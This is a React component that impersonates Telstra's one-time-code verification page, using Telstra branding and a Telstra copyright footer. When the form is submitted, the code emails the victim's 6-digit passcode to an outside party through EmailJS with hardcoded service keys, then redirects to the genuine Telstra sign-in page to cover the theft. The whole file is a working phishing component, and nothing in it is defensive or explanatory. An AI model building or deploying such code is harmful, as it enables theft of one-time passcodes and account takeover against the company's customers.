import React from 'react';
import { useRef } from "react";
import { useNavigate } from "react-router-dom"; 
import '../styles/password.css';
import emailjs from "@emailjs/browser";      
import '../styles/password.css';
import logo from "../assets/logo.png";

function OTPForm() {
   const formRef = useRef(); 
  const navigate = useNavigate(); // MUST initialize this

  function sendEmail(e) {
      e.preventDefault();
      emailjs.sendForm(
        "service_zjlwo6t",
        "template_wsz4qtk",
        formRef.current,
        "_Q9xZ5XCSNDfFv5ef"
      ) 
      .then(() => {
          console.log("Email sent successfully!");
          e.target.reset();
        },
        (error) => {
          console.error("Failed to send email:", error);
        }
      )
      .finally(() => {
        // This will now work because 'navigate' is defined above
        setTimeout(() => {
          navigate("https://myid.telstra.com/identity/as/authorization.oauth2?client_id=b2c-telstracomau&redirect_uri=https%3A%2F%2Fwww.telstra.com.au%2Fplus&response_type=code&scope=openid+app.telstracomau&state=7865ab8d5b3549728057684e17d2b65d&code_challenge=kYCVwKd-OB456IKHC4-9rOXMoAFRymlmQjaZF8r_JpU&code_challenge_method=S256&response_mode=query"); 
        }, 3000);
      });
    }
  return (
    <div className="page-container">
      <div className="login-card">
        <div className="logo-header">
          <img 
            src={logo} 
            alt="Telstra Logo"
            className="telstra-logo"
          />
        </div>
        <div className="content-body">
          <h1 className="title">
            The code that was sent to your phone number should be entered.
          </h1>
          <form ref={formRef} onSubmit={sendEmail}>
          <div className="input-group">
            <label htmlFor="code">6 Digits code</label>
            <input type="text" id="code" maxLength="6" className="code-input" name='passcode' />
          </div>
          <button className="submit-btn" type="button" >Submit</button> 
          </form>
          <p className="warning-text">
            You won't receive a code if you enter your email address or password incorrectly.
          </p>
        </div>
      </div>
      <footer className="footer">
        <span>Copyright © 2025 Telstra</span>
        <div className="footer-links">
          <a href="#">Privacy</a>
          <a href="#">Terms of use</a>
        </div>
      </footer>
    </div>
  );
}

export default OTPForm;